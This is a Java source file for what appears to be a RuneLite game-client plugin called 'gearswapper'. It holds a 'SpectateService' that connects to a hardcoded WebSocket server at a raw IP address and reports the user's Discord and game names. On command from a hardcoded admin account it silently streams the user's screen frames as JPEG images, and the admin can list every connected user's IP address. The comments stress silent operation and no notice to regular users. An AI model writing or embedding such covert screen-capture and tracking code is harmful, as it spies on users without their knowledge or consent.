package com.tonic.plugins.gearswapper.friendshare;

import com.google.gson.Gson;
import com.google.gson.JsonArray;
import com.google.gson.JsonObject;
import net.runelite.api.Client;
import net.runelite.client.callback.ClientThread;

import javax.inject.Inject;
import javax.inject.Singleton;
import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.WebSocket;
import java.util.*;
import java.util.concurrent.*;
import java.util.function.Consumer;

/**
 * Service for admin spectate system.
 * Connects to server, handles silent streaming when requested.
 * No logging for regular users.
 */
@Singleton
public class SpectateService implements WebSocket.Listener {

    private static final String SERVER_URL = "ws://172.233.59.91:8765";
    private static final String ADMIN = "thenoid2";

    private final Client client;
    private final ClientThread clientThread;
    private final Gson gson = new Gson();

    private WebSocket webSocket;
    private boolean connected = false;
    private String discordName;
    private String rsn;

    // Admin status
    private boolean isAdmin = false;

    // Streaming state
    private boolean streaming = false;

    // Callbacks
    private Runnable onStartStream;
    private Runnable onStopStream;
    private Consumer<byte[]> onFrameReceived;
    private Consumer<List<UserInfo>> onUserListReceived;

    private final StringBuilder messageBuffer = new StringBuilder();

    @Inject
    public SpectateService(Client client, ClientThread clientThread) {
        this.client = client;
        this.clientThread = clientThread;
    }

    /**
     * Connect to the spectate server.
     */
    public void connect(String discordName, String rsn) {
        if (connected)
            return;

        this.discordName = discordName;
        this.rsn = rsn;

        try {
            HttpClient httpClient = HttpClient.newHttpClient();
            webSocket = httpClient.newWebSocketBuilder()
                    .buildAsync(URI.create(SERVER_URL), this)
                    .join();
        } catch (Exception e) {
            // Silent failure
        }
    }

    public void disconnect() {
        if (webSocket != null) {
            try {
                webSocket.sendClose(WebSocket.NORMAL_CLOSURE, "");
            } catch (Exception e) {
            }
            webSocket = null;
        }
        connected = false;
        streaming = false;
    }

    // ========== Admin Methods ==========

    public void requestUserList() {
        if (!connected || !isAdmin)
            return;

        JsonObject msg = new JsonObject();
        msg.addProperty("type", "get_users");
        msg.addProperty("discordName", discordName);
        send(msg.toString());
    }

    public void viewUser(String targetDiscord) {
        if (!connected || !isAdmin)
            return;

        JsonObject msg = new JsonObject();
        msg.addProperty("type", "view_user");
        msg.addProperty("adminDiscord", discordName);
        msg.addProperty("targetDiscord", targetDiscord);
        send(msg.toString());
    }

    public void stopView() {
        if (!connected || !isAdmin)
            return;

        JsonObject msg = new JsonObject();
        msg.addProperty("type", "stop_view");
        msg.addProperty("adminDiscord", discordName);
        send(msg.toString());
    }

    /**
     * Send a screen frame (base64 JPEG).
     */
    public void sendFrame(byte[] jpegData) {
        if (!connected || !streaming)
            return;

        String base64 = Base64.getEncoder().encodeToString(jpegData);

        JsonObject msg = new JsonObject();
        msg.addProperty("type", "frame");
        msg.addProperty("discordName", discordName);
        msg.addProperty("data", base64);

        send(msg.toString());
    }

    // ========== Getters ==========

    public boolean isConnected() {
        return connected;
    }

    public boolean isAdmin() {
        return discordName != null && discordName.equalsIgnoreCase(ADMIN);
    }

    public boolean isStreaming() {
        return streaming;
    }

    public String getDiscordName() {
        return discordName;
    }

    // ========== Callbacks ==========

    public void setOnStartStream(Runnable callback) {
        this.onStartStream = callback;
    }

    public void setOnStopStream(Runnable callback) {
        this.onStopStream = callback;
    }

    public void setOnFrameReceived(Consumer<byte[]> callback) {
        this.onFrameReceived = callback;
    }

    public void setOnUserListReceived(Consumer<List<UserInfo>> callback) {
        this.onUserListReceived = callback;
    }

    // ========== WebSocket Listener ==========

    @Override
    public void onOpen(WebSocket webSocket) {
        connected = true;
        webSocket.request(1);

        // Send connect message
        JsonObject msg = new JsonObject();
        msg.addProperty("type", "connect");
        msg.addProperty("discordName", discordName);
        msg.addProperty("rsn", rsn);
        send(msg.toString());
    }

    @Override
    public CompletionStage<?> onText(WebSocket webSocket, CharSequence data, boolean last) {
        messageBuffer.append(data);

        if (last) {
            String message = messageBuffer.toString();
            messageBuffer.setLength(0);
            handleMessage(message);
        }

        webSocket.request(1);
        return null;
    }

    @Override
    public CompletionStage<?> onClose(WebSocket webSocket, int statusCode, String reason) {
        connected = false;
        streaming = false;
        return null;
    }

    @Override
    public void onError(WebSocket webSocket, Throwable error) {
        connected = false;
    }

    // ========== Private Methods ==========

    private void send(String message) {
        if (webSocket != null && connected) {
            webSocket.sendText(message, true);
        }
    }

    private void handleMessage(String message) {
        try {
            JsonObject json = gson.fromJson(message, JsonObject.class);
            String type = json.get("type").getAsString();

            switch (type) {
                case "connected":
                    isAdmin = json.has("isAdmin") && json.get("isAdmin").getAsBoolean();
                    break;

                case "start_stream":
                    streaming = true;
                    if (onStartStream != null) {
                        onStartStream.run();
                    }
                    break;

                case "stop_stream":
                    streaming = false;
                    if (onStopStream != null) {
                        onStopStream.run();
                    }
                    break;

                case "user_list":
                    handleUserList(json);
                    break;

                case "frame":
                    handleFrameReceived(json);
                    break;
            }
        } catch (Exception e) {
            // Silent
        }
    }

    private void handleUserList(JsonObject json) {
        if (!json.has("users") || onUserListReceived == null)
            return;

        List<UserInfo> users = new ArrayList<>();
        JsonArray arr = json.getAsJsonArray("users");
        for (var elem : arr) {
            JsonObject u = elem.getAsJsonObject();
            users.add(new UserInfo(
                    u.get("discordName").getAsString(),
                    u.get("rsn").getAsString(),
                    u.get("ip").getAsString(),
                    u.get("connectedAt").getAsLong(),
                    u.get("streaming").getAsBoolean()));
        }
        onUserListReceived.accept(users);
    }

    private void handleFrameReceived(JsonObject json) {
        if (!json.has("data") || onFrameReceived == null)
            return;

        try {
            String base64 = json.get("data").getAsString();
            byte[] data = Base64.getDecoder().decode(base64);
            onFrameReceived.accept(data);
        } catch (Exception e) {
            // Silent
        }
    }

    /**
     * User info for admin panel.
     */
    public static class UserInfo {
        public final String discordName;
        public final String rsn;
        public final String ip;
        public final long connectedAt;
        public final boolean streaming;

        public UserInfo(String discordName, String rsn, String ip, long connectedAt, boolean streaming) {
            this.discordName = discordName;
            this.rsn = rsn;
            this.ip = ip;
            this.connectedAt = connectedAt;
            this.streaming = streaming;
        }
    }
}
